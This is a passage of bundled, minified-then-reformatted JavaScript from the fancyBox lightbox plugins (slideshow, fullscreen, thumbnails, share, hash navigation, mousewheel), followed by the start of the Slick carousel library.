              (e.opts.i18n[e.opts.lang] || e.opts.i18n.en).PLAY_START
            )
            .removeClass("fancybox-button--pause")
            .addClass("fancybox-button--play"),
          (t.isActive = !1),
          t.instance.trigger("onSlideShowChange", !1),
          t.$progress && t.$progress.removeAttr("style").hide();
      },
      toggle: function () {
        this.isActive ? this.stop() : this.start();
      },
    }),
      e(t).on({
        "onInit.fb": function (t, e) {
          e && !e.SlideShow && (e.SlideShow = new n(e));
        },
        "beforeShow.fb": function (t, e, n, i) {
          var o = e && e.SlideShow;
          i
            ? o && n.opts.slideShow.autoStart && o.start()
            : o && o.isActive && o.clear();
        },
        "afterShow.fb": function (t, e, n) {
          var i = e && e.SlideShow;
          i && i.isActive && i.set();
        },
        "afterKeydown.fb": function (n, i, o, s, r) {
          var a = i && i.SlideShow;
          a &&
            o.opts.slideShow &&
            (80 === r || 32 === r) &&
            !e(t.activeElement).is("button,a,input") &&
            (s.preventDefault(), a.toggle());
        },
        "beforeClose.fb onDeactivate.fb": function (t, e) {
          var n = e && e.SlideShow;
          n && n.stop();
        },
      }),
      e(t).on("visibilitychange", function () {
        var n = e.fancybox.getInstance(),
          i = n && n.SlideShow;
        i && i.isActive && (t.hidden ? i.clear() : i.set());
      });
  })(document, jQuery),
  (function (t, e) {
    var n = (function () {
      for (
        var e = [
            [
              "requestFullscreen",
              "exitFullscreen",
              "fullscreenElement",
              "fullscreenEnabled",
              "fullscreenchange",
              "fullscreenerror",
            ],
            [
              "webkitRequestFullscreen",
              "webkitExitFullscreen",
              "webkitFullscreenElement",
              "webkitFullscreenEnabled",
              "webkitfullscreenchange",
              "webkitfullscreenerror",
            ],
            [
              "webkitRequestFullScreen",
              "webkitCancelFullScreen",
              "webkitCurrentFullScreenElement",
              "webkitCancelFullScreen",
              "webkitfullscreenchange",
              "webkitfullscreenerror",
            ],
            [
              "mozRequestFullScreen",
              "mozCancelFullScreen",
              "mozFullScreenElement",
              "mozFullScreenEnabled",
              "mozfullscreenchange",
              "mozfullscreenerror",
            ],
            [
              "msRequestFullscreen",
              "msExitFullscreen",
              "msFullscreenElement",
              "msFullscreenEnabled",
              "MSFullscreenChange",
              "MSFullscreenError",
            ],
          ],
          n = {},
          i = 0;
        i < e.length;
        i++
      ) {
        var o = e[i];
        if (o && o[1] in t) {
          for (var s = 0; s < o.length; s++) n[e[0][s]] = o[s];
          return n;
        }
      }
      return !1;
    })();
    if (n) {
      var i = {
        request: function (e) {
          (e = e || t.documentElement)[n.requestFullscreen](
            e.ALLOW_KEYBOARD_INPUT
          );
        },
        exit: function () {
          t[n.exitFullscreen]();
        },
        toggle: function (e) {
          (e = e || t.documentElement),
            this.isFullscreen() ? this.exit() : this.request(e);
        },
        isFullscreen: function () {
          return Boolean(t[n.fullscreenElement]);
        },
        enabled: function () {
          return Boolean(t[n.fullscreenEnabled]);
        },
      };
      e.extend(!0, e.fancybox.defaults, {
        btnTpl: {
          fullScreen:
            '<button data-fancybox-fullscreen class="fancybox-button fancybox-button--fsenter" title="{{FULL_SCREEN}}"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7 14H5v5h5v-2H7v-3zm-2-4h2V7h3V5H5v5zm12 7h-3v2h5v-5h-2v3zM14 5v2h3v3h2V5h-5z"/></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 16h3v3h2v-5H5zm3-8H5v2h5V5H8zm6 11h2v-3h3v-2h-5zm2-11V5h-2v5h5V8z"/></svg></button>',
        },
        fullScreen: { autoStart: !1 },
      }),
        e(t).on(n.fullscreenchange, function () {
          var t = i.isFullscreen(),
            n = e.fancybox.getInstance();
          n &&
            (n.current &&
              "image" === n.current.type &&
              n.isAnimating &&
              ((n.isAnimating = !1),
              n.update(!0, !0, 0),
              n.isComplete || n.complete()),
            n.trigger("onFullscreenChange", t),
            n.$refs.container.toggleClass("fancybox-is-fullscreen", t),
            n.$refs.toolbar
              .find("[data-fancybox-fullscreen]")
              .toggleClass("fancybox-button--fsenter", !t)
              .toggleClass("fancybox-button--fsexit", t));
        });
    }
    e(t).on({
      "onInit.fb": function (t, e) {
        var o;
        if (!n) {
          e.$refs.toolbar.find("[data-fancybox-fullscreen]").remove();
          return;
        }
        e && e.group[e.currIndex].opts.fullScreen
          ? ((o = e.$refs.container).on(
              "click.fb-fullscreen",
              "[data-fancybox-fullscreen]",
              function (t) {
                t.stopPropagation(), t.preventDefault(), i.toggle();
              }
            ),
            e.opts.fullScreen &&
              !0 === e.opts.fullScreen.autoStart &&
              i.request(),
            (e.FullScreen = i))
          : e && e.$refs.toolbar.find("[data-fancybox-fullscreen]").hide();
      },
      "afterKeydown.fb": function (t, e, n, i, o) {
        e &&
          e.FullScreen &&
          70 === o &&
          (i.preventDefault(), e.FullScreen.toggle());
      },
      "beforeClose.fb": function (t, e) {
        e &&
          e.FullScreen &&
          e.$refs.container.hasClass("fancybox-is-fullscreen") &&
          i.exit();
      },
    });
  })(document, jQuery),
  (function (t, e) {
    var n = "fancybox-thumbs",
      i = n + "-active";
    e.fancybox.defaults = e.extend(
      !0,
      {
        btnTpl: {
          thumbs:
            '<button data-fancybox-thumbs class="fancybox-button fancybox-button--thumbs" title="{{THUMBS}}"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.59 14.59h3.76v3.76h-3.76v-3.76zm-4.47 0h3.76v3.76h-3.76v-3.76zm-4.47 0h3.76v3.76H5.65v-3.76zm8.94-4.47h3.76v3.76h-3.76v-3.76zm-4.47 0h3.76v3.76h-3.76v-3.76zm-4.47 0h3.76v3.76H5.65v-3.76zm8.94-4.47h3.76v3.76h-3.76V5.65zm-4.47 0h3.76v3.76h-3.76V5.65zm-4.47 0h3.76v3.76H5.65V5.65z"/></svg></button>',
        },
        thumbs: {
          autoStart: !1,
          hideOnClose: !0,
          parentEl: ".fancybox-container",
          axis: "y",
        },
      },
      e.fancybox.defaults
    );
    var o = function (t) {
      this.init(t);
    };
    e.extend(o.prototype, {
      $button: null,
      $grid: null,
      $list: null,
      isVisible: !1,
      isActive: !1,
      init: function (t) {
        var e = this,
          n = t.group,
          i = 0;
        (e.instance = t),
          (e.opts = n[t.currIndex].opts.thumbs),
          (t.Thumbs = e),
          (e.$button = t.$refs.toolbar.find("[data-fancybox-thumbs]"));
        for (
          var o = 0, s = n.length;
          o < s && (n[o].thumb && i++, !(i > 1));
          o++
        );
        i > 1 && e.opts
          ? (e.$button.removeAttr("style").on("click", function () {
              e.toggle();
            }),
            (e.isActive = !0))
          : e.$button.hide();
      },
      create: function () {
        var t,
          i = this,
          o = i.instance,
          s = i.opts.parentEl,
          r = [];
        i.$grid ||
          ((i.$grid = e(
            '<div class="' + n + " " + n + "-" + i.opts.axis + '"></div>'
          ).appendTo(o.$refs.container.find(s).addBack().filter(s))),
          i.$grid.on("click", "a", function () {
            o.jumpTo(e(this).attr("data-index"));
          })),
          i.$list ||
            (i.$list = e('<div class="' + n + '__list">').appendTo(i.$grid)),
          e.each(o.group, function (e, n) {
            (t = n.thumb) || "image" !== n.type || (t = n.src),
              r.push(
                '<a href="javascript:;" tabindex="0" data-index="' +
                  e +
                  '"' +
                  (t && t.length
                    ? ' style="background-image:url(' + t + ')"'
                    : 'class="fancybox-thumbs-missing"') +
                  "></a>"
              );
          }),
          (i.$list[0].innerHTML = r.join("")),
          "x" === i.opts.axis &&
            i.$list.width(
              parseInt(i.$grid.css("padding-right"), 10) +
                o.group.length * i.$list.children().eq(0).outerWidth(!0)
            );
      },
      focus: function (t) {
        var e,
          n,
          o = this.$list,
          s = this.$grid;
        this.instance.current &&
          ((n = (e = o
            .children()
            .removeClass(i)
            .filter('[data-index="' + this.instance.current.index + '"]')
            .addClass(i)).position()),
          "y" === this.opts.axis &&
          (n.top < 0 || n.top > o.height() - e.outerHeight())
            ? o.stop().animate({ scrollTop: o.scrollTop() + n.top }, t)
            : "x" === this.opts.axis &&
              (n.left < s.scrollLeft() ||
                n.left > s.scrollLeft() + (s.width() - e.outerWidth())) &&
              o.parent().stop().animate({ scrollLeft: n.left }, t));
      },
      update: function () {
        this.instance.$refs.container.toggleClass(
          "fancybox-show-thumbs",
          this.isVisible
        ),
          this.isVisible
            ? (this.$grid || this.create(),
              this.instance.trigger("onThumbsShow"),
              this.focus(0))
            : this.$grid && this.instance.trigger("onThumbsHide"),
          this.instance.update();
      },
      hide: function () {
        (this.isVisible = !1), this.update();
      },
      show: function () {
        (this.isVisible = !0), this.update();
      },
      toggle: function () {
        (this.isVisible = !this.isVisible), this.update();
      },
    }),
      e(t).on({
        "onInit.fb": function (t, e) {
          var n;
          e &&
            !e.Thumbs &&
            (n = new o(e)).isActive &&
            !0 === n.opts.autoStart &&
            n.show();
        },
        "beforeShow.fb": function (t, e, n, i) {
          var o = e && e.Thumbs;
          o && o.isVisible && o.focus(i ? 0 : 250);
        },
        "afterKeydown.fb": function (t, e, n, i, o) {
          var s = e && e.Thumbs;
          s && s.isActive && 71 === o && (i.preventDefault(), s.toggle());
        },
        "beforeClose.fb": function (t, e) {
          var n = e && e.Thumbs;
          n && n.isVisible && !1 !== n.opts.hideOnClose && n.$grid.hide();
        },
      });
  })(document, jQuery),
  (function (t, e) {
    e.extend(!0, e.fancybox.defaults, {
      btnTpl: {
        share:
          '<button data-fancybox-share class="fancybox-button fancybox-button--share" title="{{SHARE}}"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2.55 19c1.4-8.4 9.1-9.8 11.9-9.8V5l7 7-7 6.3v-3.5c-2.8 0-10.5 2.1-11.9 4.2z"/></svg></button>',
      },
      share: {
        url: function (t, e) {
          return (
            (!t.currentHash &&
              "inline" !== e.type &&
              "html" !== e.type &&
              (e.origSrc || e.src)) ||
            window.location
          );
        },
        tpl: '<div class="fancybox-share"><h1>{{SHARE}}</h1><p><a class="fancybox-share__button fancybox-share__button--fb" href="https://www.facebook.com/sharer/sharer.php?u={{url}}"><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m287 456v-299c0-21 6-35 35-35h38v-63c-7-1-29-3-55-3-54 0-91 33-91 94v306m143-254h-205v72h196" /></svg><span>Facebook</span></a><a class="fancybox-share__button fancybox-share__button--tw" href="https://twitter.com/intent/tweet?url={{url}}&text={{descr}}"><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m456 133c-14 7-31 11-47 13 17-10 30-27 37-46-15 10-34 16-52 20-61-62-157-7-141 75-68-3-129-35-169-85-22 37-11 86 26 109-13 0-26-4-37-9 0 39 28 72 65 80-12 3-25 4-37 2 10 33 41 57 77 57-42 30-77 38-122 34 170 111 378-32 359-208 16-11 30-25 41-42z" /></svg><span>Twitter</span></a><a class="fancybox-share__button fancybox-share__button--pt" href="https://www.pinterest.com/pin/create/button/?url={{url}}&description={{descr}}&media={{media}}"><svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="m265 56c-109 0-164 78-164 144 0 39 15 74 47 87 5 2 10 0 12-5l4-19c2-6 1-8-3-13-9-11-15-25-15-45 0-58 43-110 113-110 62 0 96 38 96 88 0 67-30 122-73 122-24 0-42-19-36-44 6-29 20-60 20-81 0-19-10-35-31-35-25 0-44 26-44 60 0 21 7 36 7 36l-30 125c-8 37-1 83 0 87 0 3 4 4 5 2 2-3 32-39 42-75l16-64c8 16 31 29 56 29 74 0 124-67 124-157 0-69-58-132-146-132z" fill="#fff"/></svg><span>Pinterest</span></a></p><p><input class="fancybox-share__input" type="text" value="{{url_raw}}" onclick="select()" /></p></div>',
      },
    }),
      e(t).on("click", "[data-fancybox-share]", function () {
        var t,
          n,
          i,
          o,
          s = e.fancybox.getInstance(),
          r = s.current || null;
        r &&
          ("function" === e.type(r.opts.share.url) &&
            (i = r.opts.share.url.apply(r, [s, r])),
          (o = r.opts.share.tpl
            .replace(
              /\{\{media\}\}/g,
              "image" === r.type ? encodeURIComponent(r.src) : ""
            )
            .replace(/\{\{url\}\}/g, encodeURIComponent(i))
            .replace(
              /\{\{url_raw\}\}/g,
              ((n = {
                "&": "&amp;",
                "<": "&lt;",
                ">": "&gt;",
                '"': "&quot;",
                "'": "&#39;",
                "/": "&#x2F;",
                "`": "&#x60;",
                "=": "&#x3D;",
              }),
              String((t = i)).replace(/[&<>"'`=\/]/g, function (t) {
                return n[t];
              }))
            )
            .replace(
              /\{\{descr\}\}/g,
              s.$caption ? encodeURIComponent(s.$caption.text()) : ""
            )),
          e.fancybox.open({
            src: s.translate(s, o),
            type: "html",
            opts: {
              touch: !1,
              animationEffect: !1,
              afterLoad: function (t, e) {
                s.$refs.container.one("beforeClose.fb", function () {
                  t.close(null, 0);
                }),
                  e.$content.find(".fancybox-share__button").click(function () {
                    return (
                      window.open(this.href, "Share", "width=550, height=450"),
                      !1
                    );
                  });
              },
              mobile: { autoFocus: !1 },
            },
          }));
      });
  })(document, jQuery),
  (function (t, e, n) {
    function i() {
      var e = t.location.hash.substr(1),
        n = e.split("-"),
        i =
          (n.length > 1 &&
            /^\+?\d+$/.test(n[n.length - 1]) &&
            parseInt(n.pop(-1), 10)) ||
          1;
      return { hash: e, index: i < 1 ? 1 : i, gallery: n.join("-") };
    }
    function o(t) {
      "" !== t.gallery &&
        n("[data-fancybox='" + n.escapeSelector(t.gallery) + "']")
          .eq(t.index - 1)
          .focus()
          .trigger("click.fb-start");
    }
    function s(t) {
      var e, n;
      return (
        !!t &&
        "" !==
          (n =
            (e = t.current ? t.current.opts : t.opts).hash ||
            (e.$orig
              ? e.$orig.data("fancybox") || e.$orig.data("fancybox-trigger")
              : "")) &&
        n
      );
    }
    n.escapeSelector ||
      (n.escapeSelector = function (t) {
        var e = function (t, e) {
          return e
            ? "\0" === t
              ? "пїЅ"
              : t.slice(0, -1) +
                "\\" +
                t.charCodeAt(t.length - 1).toString(16) +
                " "
            : "\\" + t;
        };
        return (t + "").replace(
          /([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g,
          e
        );
      }),
      n(function () {
        !1 !== n.fancybox.defaults.hash &&
          (n(e).on({
            "onInit.fb": function (t, e) {
              var n, o;
              !1 !== e.group[e.currIndex].opts.hash &&
                ((n = i()),
                (o = s(e)) &&
                  n.gallery &&
                  o == n.gallery &&
                  (e.currIndex = n.index - 1));
            },
            "beforeShow.fb": function (n, i, o, r) {
              var a;
              o &&
                !1 !== o.opts.hash &&
                (a = s(i)) &&
                ((i.currentHash =
                  a + (i.group.length > 1 ? "-" + (o.index + 1) : "")),
                t.location.hash !== "#" + i.currentHash &&
                  (r && !i.origHash && (i.origHash = t.location.hash),
                  i.hashTimer && clearTimeout(i.hashTimer),
                  (i.hashTimer = setTimeout(function () {
                    "replaceState" in t.history
                      ? (t.history[r ? "pushState" : "replaceState"](
                          {},
                          e.title,
                          t.location.pathname +
                            t.location.search +
                            "#" +
                            i.currentHash
                        ),
                        r && (i.hasCreatedHistory = !0))
                      : (t.location.hash = i.currentHash),
                      (i.hashTimer = null);
                  }, 300))));
            },
            "beforeClose.fb": function (n, i, o) {
              o &&
                !1 !== o.opts.hash &&
                (clearTimeout(i.hashTimer),
                i.currentHash && i.hasCreatedHistory
                  ? t.history.back()
                  : i.currentHash &&
                    ("replaceState" in t.history
                      ? t.history.replaceState(
                          {},
                          e.title,
                          t.location.pathname +
                            t.location.search +
                            (i.origHash || "")
                        )
                      : (t.location.hash = i.origHash)),
                (i.currentHash = null));
            },
          }),
          n(t).on("hashchange.fb", function () {
            var t = i(),
              e = null;
            n.each(n(".fancybox-container").get().reverse(), function (t, i) {
              var o = n(i).data("FancyBox");
              if (o && o.currentHash) return (e = o), !1;
            }),
              e
                ? e.currentHash === t.gallery + "-" + t.index ||
                  (1 === t.index && e.currentHash == t.gallery) ||
                  ((e.currentHash = null), e.close())
                : "" !== t.gallery && o(t);
          }),
          setTimeout(function () {
            n.fancybox.getInstance() || o(i());
          }, 50));
      });
  })(window, document, jQuery),
  (function (t, e) {
    var n = new Date().getTime();
    e(t).on({
      "onInit.fb": function (t, e, i) {
        e.$refs.stage.on(
          "mousewheel DOMMouseScroll wheel MozMousePixelScroll",
          function (t) {
            var i = e.current,
              o = new Date().getTime();
            !(
              e.group.length < 2 ||
              !1 === i.opts.wheel ||
              ("auto" === i.opts.wheel && "image" !== i.type) ||
              (t.preventDefault(),
              t.stopPropagation(),
              i.$slide.hasClass("fancybox-animated"))
            ) &&
              ((t = t.originalEvent || t),
              o - n < 250 ||
                ((n = o),
                e[
                  0 > (-t.deltaY || -t.deltaX || t.wheelDelta || -t.detail)
                    ? "next"
                    : "previous"
                ]()));
          }
        );
      },
    });
  })(document, jQuery),
  (function (t) {
    "function" == typeof define && define.amd
      ? define(["jquery"], t)
      : "undefined" != typeof exports
      ? (module.exports = t(require("jquery")))
      : t(jQuery);
  })(function (t) {
    var e,
      n = window.Slick || {};
    ((n =
      ((e = 0),
      function (n, i) {
        var o,
          s = this;
        (s.defaults = {
          accessibility: !0,
          adaptiveHeight: !1,
          appendArrows: t(n),
          appendDots: t(n),
          arrows: !0,
          asNavFor: null,
          prevArrow:
            '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
          nextArrow:
            '<button class="slick-next" aria-label="Next" type="button">Next</button>',
          autoplay: !1,
          autoplaySpeed: 3e3,
          centerMode: !1,
          centerPadding: "50px",
          cssEase: "ease",
          customPaging: function (e, n) {
            return t('<button type="button" />').text(n + 1);
          },
          dots: !1,
          dotsClass: "slick-dots",
          draggable: !0,
          easing: "linear",
          edgeFriction: 0.35,
          fade: !1,
          focusOnSelect: !1,
          focusOnChange: !1,
          infinite: !0,
          initialSlide: 0,
          lazyLoad: "ondemand",
          mobileFirst: !1,
          pauseOnHover: !0,
          pauseOnFocus: !0,
          pauseOnDotsHover: !1,
          respondTo: "window",
          responsive: null,
          rows: 1,
          rtl: !1,
          slide: "",
          slidesPerRow: 1,
          slidesToShow: 1,
          slidesToScroll: 1,
          speed: 500,
          swipe: !0,
          swipeToSlide: !1,
          touchMove: !0,
          touchThreshold: 5,
          useCSS: !0,
          useTransform: !0,
          variableWidth: !1,
          vertical: !1,
          verticalSwiping: !1,
          waitForAnimate: !0,
          zIndex: 1e3,
        }),
          (s.initials = {
            animating: !1,
            dragging: !1,
            autoPlayTimer: null,
            currentDirection: 0,
            currentLeft: null,
            currentSlide: 0,
            direction: 1,
            $dots: null,
            listWidth: null,
            listHeight: null,
            loadIndex: 0,
            $nextArrow: null,
            $prevArrow: null,
            scrolling: !1,
            slideCount: null,
            slideWidth: null,
            $slideTrack: null,
            $slides: null,
            sliding: !1,
            slideOffset: 0,
            swipeLeft: null,
            swiping: !1,
            $list: null,
            touchObject: {},
            transformsEnabled: !1,
            unslicked: !1,
          }),
          t.extend(s, s.initials),
          (s.activeBreakpoint = null),
          (s.animType = null),
          (s.animProp = null),
          (s.breakpoints = []),
          (s.breakpointSettings = []),
          (s.cssTransitions = !1),
          (s.focussed = !1),
          (s.interrupted = !1),
          (s.hidden = "hidden"),
          (s.paused = !0),
          (s.positionProp = null),
          (s.respondTo = null),
          (s.rowCount = 1),
          (s.shouldClick = !0),
          (s.$slider = t(n)),
          (s.$slidesCache = null),
          (s.transformType = null),
          (s.transitionType = null),
          (s.visibilityChange = "visibilitychange"),
          (s.windowWidth = 0),
          (s.windowTimer = null),
          (o = t(n).data("slick") || {}),
          (s.options = t.extend({}, s.defaults, i, o)),
          (s.currentSlide = s.options.initialSlide),
          (s.originalSettings = s.options),
          void 0 !== document.mozHidden
            ? ((s.hidden = "mozHidden"),
              (s.visibilityChange = "mozvisibilitychange"))
            : void 0 !== document.webkitHidden &&
              ((s.hidden = "webkitHidden"),
              (s.visibilityChange = "webkitvisibilitychange")),
          (s.autoPlay = t.proxy(s.autoPlay, s)),
          (s.autoPlayClear = t.proxy(s.autoPlayClear, s)),
          (s.autoPlayIterator = t.proxy(s.autoPlayIterator, s)),
          (s.changeSlide = t.proxy(s.changeSlide, s)),
          (s.clickHandler = t.proxy(s.clickHandler, s)),
          (s.selectHandler = t.proxy(s.selectHandler, s)),
          (s.setPosition = t.proxy(s.setPosition, s)),
          (s.swipeHandler = t.proxy(s.swipeHandler, s)),
          (s.dragHandler = t.proxy(s.dragHandler, s)),
          (s.keyHandler = t.proxy(s.keyHandler, s)),
          (s.instanceUid = e++),
          (s.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/),
          s.registerBreakpoints(),
          s.init(!0);
      })).prototype.activateADA = function () {
      this.$slideTrack
        .find(".slick-active")
        .attr({ "aria-hidden": "false" })
        .find("a, input, button, select")
        .attr({ tabindex: "0" });
    }),
      (n.prototype.addSlide = n.prototype.slickAdd =
        function (e, n, i) {
          var o = this;
          if ("boolean" == typeof n) (i = n), (n = null);
          else if (n < 0 || n >= o.slideCount) return !1;
          o.unload(),
            "number" == typeof n
              ? 0 === n && 0 === o.$slides.length
                ? t(e).appendTo(o.$slideTrack)
                : i
                ? t(e).insertBefore(o.$slides.eq(n))
                : t(e).insertAfter(o.$slides.eq(n))
              : !0 === i
              ? t(e).prependTo(o.$slideTrack)
              : t(e).appendTo(o.$slideTrack),
            (o.$slides = o.$slideTrack.children(this.options.slide)),
            o.$slideTrack.children(this.options.slide).detach(),
            o.$slideTrack.append(o.$slides),
            o.$slides.each(function (e, n) {
              t(n).attr("data-slick-index", e);
            }),
            (o.$slidesCache = o.$slides),
            o.reinit();
        }),
      (n.prototype.animateHeight = function () {
        if (
          1 === this.options.slidesToShow &&
          !0 === this.options.adaptiveHeight &&
          !1 === this.options.vertical
        ) {
          var t = this.$slides.eq(this.currentSlide).outerHeight(!0);
          this.$list.animate({ height: t }, this.options.speed);
        }
      }),
      (n.prototype.animateSlide = function (e, n) {
        var i = {},
          o = this;
        o.animateHeight(),
          !0 === o.options.rtl && !1 === o.options.vertical && (e = -e),
          !1 === o.transformsEnabled
            ? !1 === o.options.vertical
              ? o.$slideTrack.animate(
                  { left: e },
                  o.options.speed,
                  o.options.easing,
                  n
                )
              : o.$slideTrack.animate(
                  { top: e },
                  o.options.speed,
                  o.options.easing,
                  n
                )
            : !1 === o.cssTransitions
            ? (!0 === o.options.rtl && (o.currentLeft = -o.currentLeft),
              t({ animStart: o.currentLeft }).animate(
                { animStart: e },
                {
                  duration: o.options.speed,
                  easing: o.options.easing,
                  step: function (t) {
                    (t = Math.ceil(t)),
                      !1 === o.options.vertical
                        ? ((i[o.animType] = "translate(" + t + "px, 0px)"),
                          o.$slideTrack.css(i))
                        : ((i[o.animType] = "translate(0px," + t + "px)"),
                          o.$slideTrack.css(i));
                  },
                  complete: function () {
                    n && n.call();
                  },
                }
              ))
            : (o.applyTransition(),
              (e = Math.ceil(e)),
              !1 === o.options.vertical
                ? (i[o.animType] = "translate3d(" + e + "px, 0px, 0px)")
                : (i[o.animType] = "translate3d(0px," + e + "px, 0px)"),
              o.$slideTrack.css(i),
              n &&
                setTimeout(function () {
                  o.disableTransition(), n.call();
                }, o.options.speed));
      }),
      (n.prototype.getNavTarget = function () {
        var e = this.options.asNavFor;
        return e && null !== e && (e = t(e).not(this.$slider)), e;
      }),
      (n.prototype.asNavFor = function (e) {
        var n = this.getNavTarget();
        null !== n &&
          "object" == typeof n &&
          n.each(function () {
            var n = t(this).slick("getSlick");
            n.unslicked || n.slideHandler(e, !0);
          });
      }),
      (n.prototype.applyTransition = function (t) {
        var e = this,
          n = {};
        !1 === e.options.fade
          ? (n[e.transitionType] =
              e.transformType +
              " " +
              e.options.speed +
              "ms " +
              e.options.cssEase)
          : (n[e.transitionType] =
              "opacity " + e.options.speed + "ms " + e.options.cssEase),
          !1 === e.options.fade ? e.$slideTrack.css(n) : e.$slides.eq(t).css(n);
      }),
      (n.prototype.autoPlay = function () {
        var t = this;
        t.autoPlayClear(),
          t.slideCount > t.options.slidesToShow &&
            (t.autoPlayTimer = setInterval(
              t.autoPlayIterator,
              t.options.autoplaySpeed
            ));
      }),
      (n.prototype.autoPlayClear = function () {
        this.autoPlayTimer && clearInterval(this.autoPlayTimer);
      }),
      (n.prototype.autoPlayIterator = function () {
        var t = this,
          e = t.currentSlide + t.options.slidesToScroll;
        t.paused ||
          t.interrupted ||
          t.focussed ||
          (!1 === t.options.infinite &&
            (1 === t.direction && t.currentSlide + 1 === t.slideCount - 1
              ? (t.direction = 0)
              : 0 === t.direction &&
                ((e = t.currentSlide - t.options.slidesToScroll),
                t.currentSlide - 1 == 0 && (t.direction = 1))),
          t.slideHandler(e));
      }),
      (n.prototype.buildArrows = function () {
        var e = this;
        !0 === e.options.arrows &&
          ((e.$prevArrow = t(e.options.prevArrow).addClass("slick-arrow")),
          (e.$nextArrow = t(e.options.nextArrow).addClass("slick-arrow")),
          e.slideCount > e.options.slidesToShow
            ? (e.$prevArrow
                .removeClass("slick-hidden")
                .removeAttr("aria-hidden tabindex"),
              e.$nextArrow
                .removeClass("slick-hidden")
                .removeAttr("aria-hidden tabindex"),
              e.htmlExpr.test(e.options.prevArrow) &&
                e.$prevArrow.prependTo(e.options.appendArrows),
              e.htmlExpr.test(e.options.nextArrow) &&
                e.$nextArrow.appendTo(e.options.appendArrows),
              !0 !== e.options.infinite &&
                e.$prevArrow
                  .addClass("slick-disabled")
                  .attr("aria-disabled", "true"))
            : e.$prevArrow
                .add(e.$nextArrow)
                .addClass("slick-hidden")
                .attr({ "aria-disabled": "true", tabindex: "-1" }));
      }),
      (n.prototype.buildDots = function () {
        var e,
          n,
          i = this;
        if (!0 === i.options.dots) {
          for (
            i.$slider.addClass("slick-dotted"),
              n = t("<ul />").addClass(i.options.dotsClass),
              e = 0;
            e <= i.getDotCount();
            e += 1
          )
            n.append(
              t("<li />").append(i.options.customPaging.call(this, i, e))
            );
          (i.$dots = n.appendTo(i.options.appendDots)),
            i.$dots.find("li").first().addClass("slick-active");
        }
      }),
      (n.prototype.buildOut = function () {
        var e = this;
        (e.$slides = e.$slider
          .children(e.options.slide + ":not(.slick-cloned)")
          .addClass("slick-slide")),
          (e.slideCount = e.$slides.length),
          e.$slides.each(function (e, n) {
            t(n)
              .attr("data-slick-index", e)
              .data("originalStyling", t(n).attr("style") || "");
          }),
          e.$slider.addClass("slick-slider"),
          (e.$slideTrack =
            0 === e.slideCount
              ? t('<div class="slick-track"/>').appendTo(e.$slider)
              : e.$slides.wrapAll('<div class="slick-track"/>').parent()),
          (e.$list = e.$slideTrack.wrap('<div class="slick-list"/>').parent()),
          e.$slideTrack.css("opacity", 0),
          (!0 !== e.options.centerMode && !0 !== e.options.swipeToSlide) ||
            (e.options.slidesToScroll = 1),
          t("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"),
          e.setupInfinite(),
          e.buildArrows(),
          e.buildDots(),
          e.updateDots(),
          e.setSlideClasses(
            "number" == typeof e.currentSlide ? e.currentSlide : 0
          ),
          !0 === e.options.draggable && e.$list.addClass("draggable");
      }),
      (n.prototype.buildRows = function () {
        var t, e, n, i, o, s, r;
        if (
          ((i = document.createDocumentFragment()),
          (s = this.$slider.children()),
          this.options.rows > 1)
        ) {
          for (
            r = this.options.slidesPerRow * this.options.rows,
              o = Math.ceil(s.length / r),
              t = 0;
            t < o;
            t++
          ) {
            var a = document.createElement("div");
            for (e = 0; e < this.options.rows; e++) {
              var l = document.createElement("div");
              for (n = 0; n < this.options.slidesPerRow; n++) {
                var c = t * r + (e * this.options.slidesPerRow + n);
                s.get(c) && l.appendChild(s.get(c));
              }
              a.appendChild(l);
            }
            i.appendChild(a);
          }
          this.$slider.empty().append(i),
            this.$slider
              .children()
              .children()
              .children()
              .css({
                width: 100 / this.options.slidesPerRow + "%",
                display: "inline-block",
              });
        }
      }),
      (n.prototype.checkResponsive = function (e, n) {
        var i,
          o,
          s,
          r = this,
          a = !1,
          l = r.$slider.width(),
          c = window.innerWidth || t(window).width();
        if (
          ("window" === r.respondTo
            ? (s = c)
            : "slider" === r.respondTo
            ? (s = l)
            : "min" === r.respondTo && (s = Math.min(c, l)),
          r.options.responsive &&
            r.options.responsive.length &&
            null !== r.options.responsive)
        ) {
          for (i in ((o = null), r.breakpoints))
            r.breakpoints.hasOwnProperty(i) &&
              (!1 === r.originalSettings.mobileFirst
                ? s < r.breakpoints[i] && (o = r.breakpoints[i])
                : s > r.breakpoints[i] && (o = r.breakpoints[i]));
          null !== o
            ? null !== r.activeBreakpoint
              ? (o !== r.activeBreakpoint || n) &&
                ((r.activeBreakpoint = o),
                "unslick" === r.breakpointSettings[o]
                  ? r.unslick(o)
                  : ((r.options = t.extend(
                      {},
                      r.originalSettings,
                      r.breakpointSettings[o]
                    )),
                    !0 === e && (r.currentSlide = r.options.initialSlide),
                    r.refresh(e)),
                (a = o))
              : ((r.activeBreakpoint = o),
                "unslick" === r.breakpointSettings[o]
                  ? r.unslick(o)
                  : ((r.options = t.extend(
                      {},
                      r.originalSettings,
                      r.breakpointSettings[o]
                    )),
                    !0 === e && (r.currentSlide = r.options.initialSlide),
                    r.refresh(e)),
                (a = o))
            : null !== r.activeBreakpoint &&
              ((r.activeBreakpoint = null),
              (r.options = r.originalSettings),
              !0 === e && (r.currentSlide = r.options.initialSlide),
              r.refresh(e),
              (a = o)),
            e || !1 === a || r.$slider.trigger("breakpoint", [r, a]);
        }
      }),
      (n.prototype.changeSlide = function (e, n) {
        var i,
          o,
          s,
          r = t(e.currentTarget);
        switch (
          (r.is("a") && e.preventDefault(),
          r.is("li") || (r = r.closest("li")),
          (i = (s = this.slideCount % this.options.slidesToScroll != 0)
            ? 0
            : (this.slideCount - this.currentSlide) %
              this.options.slidesToScroll),
          e.data.message)
        ) {
          case "previous":
            (o =
              0 === i
                ? this.options.slidesToScroll
                : this.options.slidesToShow - i),
